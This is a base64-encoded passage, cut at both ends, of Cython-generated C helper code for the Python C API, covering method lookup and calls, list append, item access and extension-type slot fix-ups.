ERUNSRUYoZGVzY3IpO1xuICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHtcbiAgICAgICAgKm1ldGhvZCA9IGRlc2NyO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZSh0cCk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX0F0dHJpYnV0ZUVycm9yLFxuICAgICAgICAgICAgICAgICAiXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgXCclVVwnIixcbiAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBuYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUodHlwZV9uYW1lKTtcbiAgICByZXR1cm4gMDtcbiNlbHNlXG4gICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTtcbiAgICBnb3RvIHRyeV91bnBhY2s7XG4jZW5kaWZcbnRyeV91bnBhY2s6XG4jaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShhdHRyKSAmJiBQeU1ldGhvZF9DaGVjayhhdHRyKSAmJiBsaWtlbHkoUHlNZXRob2RfR0VUX1NFTEYoYXR0cikgPT0gb2JqKSkge1xuICAgICAgICBQeU9iamVjdCAqZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oYXR0cik7XG4gICAgICAgIFB5X0lOQ1JFRihmdW5jdGlvbik7XG4gICAgICAgIFB5X0RFQ1JFRihhdHRyKTtcbiAgICAgICAgKm1ldGhvZCA9IGZ1bmN0aW9uO1xuICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4jZW5kaWZcbiAgICAqbWV0aG9kID0gYXR0cjtcbiAgICByZXR1cm4gMDtcbn1cblxuXG4jaWYgIShDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSkpXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogbWV0aG9kLCBQeU9iamVjdCogYXJnKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcobWV0aG9kLCBhcmcpO1xuICAgIFB5X0RFQ1JFRihtZXRob2QpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKSB7XG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCkpXG4gICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7b2JqLCBhcmd9O1xuICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmc7XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncztcbiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMiB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0O1xuICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7XG4gICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhtZXRob2QsIG9iaiwgYXJnKTtcbiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19QeU9iamVjdF9DYWxsTWV0aG9kMShtZXRob2QsIGFyZyk7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfQXBwZW5kKFB5T2JqZWN0KiBMLCBQeU9iamVjdCogeCkge1xuICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoTCkpKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxpc3RfQXBwZW5kKEwsIHgpIDwgMCkpIHJldHVybiAtMTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU9iamVjdCogcmV0dmFsID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FwcGVuZCwgeCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSlcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgUHlfREVDUkVGKHJldHZhbCk7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SW5kZXgoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmluZGV4KSB7XG4gICAgUHlPYmplY3QgKnJ1bmVyciA9IE5VTEw7XG4gICAgUHlfc3NpemVfdCBrZXlfdmFsdWU7XG4gICAga2V5X3ZhbHVlID0gX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoaW5kZXgpO1xuICAgIGlmIChsaWtlbHkoa2V5X3ZhbHVlICE9IC0xIHx8ICEocnVuZXJyID0gUHlFcnJfT2NjdXJyZWQoKSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0Zhc3Qob2JqLCBrZXlfdmFsdWUsIDAsIDEsIDEpO1xuICAgIH1cbiAgICBpZiAoUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHJ1bmVyciwgUHlFeGNfT3ZlcmZsb3dFcnJvcikpIHtcbiAgICAgICAgX19QeXhfVHlwZU5hbWUgaW5kZXhfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKGluZGV4KSk7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19JbmRleEVycm9yLFxuICAgICAgICAgICAgImNhbm5vdCBmaXQgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaW50byBhbiBpbmRleC1zaXplZCBpbnRlZ2VyIiwgaW5kZXhfdHlwZV9uYW1lKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGluZGV4X3R5cGVfbmFtZSk7XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtX1Nsb3coUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmtleSkge1xuICAgIF9fUHl4X1R5cGVOYW1lIG9ial90eXBlX25hbWU7XG4gICAgaWYgKGxpa2VseShQeVR5cGVfQ2hlY2sob2JqKSkpIHtcbiAgICAgICAgUHlPYmplY3QgKm1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGFzc19nZXRpdGVtKTtcbiAgICAgICAgaWYgKCFtZXRoKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcobWV0aCwga2V5KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgIH1cbiAgICB9XG4gICAgb2JqX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShvYmopKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IGlzIG5vdCBzdWJzY3JpcHRhYmxlIiwgb2JqX3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9ial90eXBlX25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICprZXkpIHtcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvYmopO1xuICAgIFB5TWFwcGluZ01ldGhvZHMgKm1tID0gdHAtPnRwX2FzX21hcHBpbmc7XG4gICAgUHlTZXF1ZW5jZU1ldGhvZHMgKnNtID0gdHAtPnRwX2FzX3NlcXVlbmNlO1xuICAgIGlmIChsaWtlbHkobW0gJiYgbW0tPm1wX3N1YnNjcmlwdCkpIHtcbiAgICAgICAgcmV0dXJuIG1tLT5tcF9zdWJzY3JpcHQob2JqLCBrZXkpO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KHNtICYmIHNtLT5zcV9pdGVtKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfR2V0SW5kZXgob2JqLCBrZXkpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfR2V0SXRlbV9TbG93KG9iaiwga2V5KTtcbn1cbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHtcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuICAgIGlmIChfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCkgPCAweDAzMDkwMDAwKSByZXR1cm4gMDtcbiAgICAjZW5kaWZcbiAgICBpZiAoIWFsd2F5c19jYWxsKSB7XG4gICAgICAgIFB5VHlwZU9iamVjdCAqYmFzZSA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7XG4gICAgICAgIHVuc2lnbmVkIGxvbmcgZmxhZ3MgPSBQeVR5cGVfR2V0RmxhZ3MoYmFzZSk7XG4gICAgICAgIGlmIChmbGFncyAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHtcbiAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X1ZJU0lUKChQeU9iamVjdCopUHlfVFlQRShvKSk7XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIFB5X3NzaXplX3QgX19QeXhfR2V0VHlwZURpY3RPZmZzZXQodm9pZCkge1xuICAgIFB5T2JqZWN0ICp0cF9kaWN0b2Zmc2V0X287XG4gICAgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0O1xuICAgIHRwX2RpY3RvZmZzZXRfbyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KikoJlB5VHlwZV9UeXBlKSwgIl9fZGljdG9mZnNldF9fIik7XG4gICAgaWYgKHVubGlrZWx5KCF0cF9kaWN0b2Zmc2V0X28pKSByZXR1cm4gLTE7XG4gICAgdHBfZGljdG9mZnNldCA9IFB5TG9uZ19Bc1NzaXplX3QodHBfZGljdG9mZnNldF9vKTtcbiAgICBQeV9ERUNSRUYodHBfZGljdG9mZnNldF9vKTtcbiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAiXCd0eXBlXCcgZG9lc25cJ3QgaGF2ZSBhIGRpY3RvZmZzZXQiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA8IDApKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhcbiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJcJ3R5cGVcJyBoYXMgYW4gdW5leHBlY3RlZCBuZWdhdGl2ZSBkaWN0b2Zmc2V0LiAiXG4gICAgICAgICAgICAiUGxlYXNlIHJlcG9ydCB0aGlzIGFzIEN5dGhvbiBidWciKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gdHBfZGljdG9mZnNldDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0VHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCkge1xuICAgIHN0YXRpYyBQeV9zc2l6ZV90IHRwX2RpY3RvZmZzZXQgPSAwO1xuICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IDApKSB7XG4gICAgICAgIHRwX2RpY3RvZmZzZXQgPSBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCgpO1xuICAgICAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICAgICAgdHBfZGljdG9mZnNldCA9IDA7IC8vIHRyeSBhZ2FpbiBuZXh0IHRpbWU/XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gKihQeU9iamVjdCoqKSgoY2hhciopdHAgKyB0cF9kaWN0b2Zmc2V0KTtcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyBpbnQgX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHAsIFB5T2JqZWN0ICprLCBQeU9iamVjdCAqdikge1xuICAgIGludCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnRwX2RpY3Q7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHRwX2RpY3QgPSBfX1B5eF9HZXRUeXBlRGljdCh0cCk7XG4gICAgaWYgKHVubGlrZWx5KCF0cF9kaWN0KSkgcmV0dXJuIC0xO1xuI2Vsc2VcbiAgICB0cF9kaWN0ID0gdHAtPnRwX2RpY3Q7XG4jZW5kaWZcbiAgICByZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0cF9kaWN0LCBrLCB2KTtcbiAgICBpZiAobGlrZWx5KCFyZXN1bHQpKSB7XG4gICAgICAgIFB5VHlwZV9Nb2RpZmllZCh0cCk7XG4gICAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9IYXNBdHRyKHYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfbmFtZSkpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqc2V0TmFtZVJlc3VsdCA9IFB5T2JqZWN0X0NhbGxNZXRob2RPYmpBcmdzKHYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfbmFtZSwgIChQeU9iamVjdCAqKSB0cCwgaywgTlVMTCk7XG4gICAgICAgICAgICBpZiAoIXNldE5hbWVSZXN1bHQpIHJldHVybiAtMTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihzZXROYW1lUmVzdWx0KTtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKSB7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwOTAwQjFcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihzcGVjKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXBlKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QpO1xuI2Vsc2VcbiAgICBjb25zdCBQeVR5cGVfU2xvdCAqc2xvdCA9IHNwZWMtPnNsb3RzO1xuICAgIGludCBjaGFuZ2VkID0gMDtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9tZW1iZXJzKVxuICAgICAgICBzbG90Kys7XG4gICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PSBQeV90cF9tZW1iZXJzKSB7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICBjb25zdFxuI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OKVxuICAgICAgICAgICAgUHlNZW1iZXJEZWYgKm1lbWIgPSAoUHlNZW1iZXJEZWYqKSBzbG90LT5wZnVuYztcbiAgICAgICAgd2hpbGUgKG1lbWIgJiYgbWVtYi0+bmFtZSkge1xuICAgICAgICAgICAgaWYgKG1lbWItPm5hbWVbMF0gPT0gXCdfXCcgJiYgbWVtYi0+bmFtZVsxXSA9PSBcJ19cJykge1xuICAgICAgICAgICAgICAgIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fd2Vha2xpc3RvZmZzZXRfXyIpID09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7XG4gICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3dlYWtsaXN0b2Zmc2V0ID0gbWVtYi0+b2Zmc2V0O1xuICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX2RpY3RvZmZzZXRfXyIpID09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7XG4gICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX2RpY3RvZmZzZXQgPSBtZW1iLT5vZmZzZXQ7XG4gICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgICAgIH1cbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX192ZWN0b3JjYWxsb2Zmc2V0X18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjRcbiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfdmVjdG9yY2FsbF9vZmZzZXQgPSBtZW1iLT5vZmZzZXQ7XG4jZWxzZVxuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF9wcmludCA9IChwcmludGZ1bmMpIG1lbWItPm9mZnNldDtcbiNlbmRpZlxuICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgICAgICB9XG4jZW5kaWYgIC8vIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX19tb2R1bGVfXyIpID09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX09CSkVDVCk7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSAwIHx8IG1lbWItPmZsYWdzID09IFJFQURPTkxZKTtcbiAgICAgICAgICAgICAgICAgICAgZGVzY3IgPSBQeURlc2NyX05ld01lbWJlcih0eXBlLCBtZW1iKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkZXNjcikpXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7XG4gICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShzZXRfaXRlbV9yZXN1bHQgPCAwKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgICAgIH1cbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgbWVtYisrO1xuICAgICAgICB9XG4gICAgfVxuI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICBzbG90ID0gc3BlYy0+c2xvdHM7XG4gICAgd2hpbGUgKHNsb3QgJiYgc2xvdC0+c2xvdCAmJiBzbG90LT5zbG90ICE9IFB5X3RwX2dldHNldClcbiAgICAgICAgc2xvdCsrO1xuICAgIGlmIChzbG90ICYmIHNsb3QtPnNsb3QgPT0gUHlfdHBfZ2V0c2V0KSB7XG4gICAgICAgIFB5R2V0U2V0RGVmICpnZXRzZXQgPSAoUHlHZXRTZXREZWYqKSBzbG90LT5wZnVuYztcbiAgICAgICAgd2hpbGUgKGdldHNldCAmJiBnZXRzZXQtPm5hbWUpIHtcbiAgICAgICAgICAgIGlmIChnZXRzZXQtPm5hbWVbMF0gPT0gXCdfXCcgJiYgZ2V0c2V0LT5uYW1lWzFdID09IFwnX1wnICYmIHN0cmNtcChnZXRzZXQtPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkZXNjciA9IFB5RGVzY3JfTmV3R2V0U2V0KHR5cGUsIGdldHNldCk7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkZXNjcikpXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpweW5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhnZXRzZXQtPm5hbWUpO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHluYW1lKSkge1xuICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBfX1B5eF9TZXRJdGVtT25UeXBlRGljdCh0eXBlLCBweW5hbWUsIGRlc2NyKTtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYocHluYW1lKTtcbiAgICAgICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7XG4gICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHR5cGUtPnRwX2RpY3QsIFB5RGVzY3JfTkFNRShkZXNjciksIGRlc2NyKTtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShzZXRfaXRlbV9yZXN1bHQgPCAwKSkge1xuICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgKytnZXRzZXQ7XG4gICAgICAgIH1cbiAgICB9XG4jZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICBpZiAoY2hhbmdlZClcbiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHR5cGUpO1xuI2VuZGlmICAvLyBQWV9WRVJTSU9OX0hFWCA+IDB4MDMwOTAwQjFcbiAgICByZXR1cm4gMDtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKSB7XG4gICAgUHlPYmplY3QgKmFyZ1syXSA9IHtOVUxMLCBOVUxMfTtcbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJnICsgMSwgMCB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpIHtcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSlcbiAgICBQeU9iamVjdCAqYXJnc1sxXSA9IHtvYmp9O1xuICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmc7XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZztcbiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMSB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0ID0gTlVMTDtcbiAgICBpbnQgaXNfbWV0aG9kID0gX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKG9iaiwgbWV0aG9kX25hbWUsICZtZXRob2QpO1xuICAgIGlmIChsaWtlbHkoaXNfbWV0aG9kKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGhvZCwgb2JqKTtcbiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgICAgIH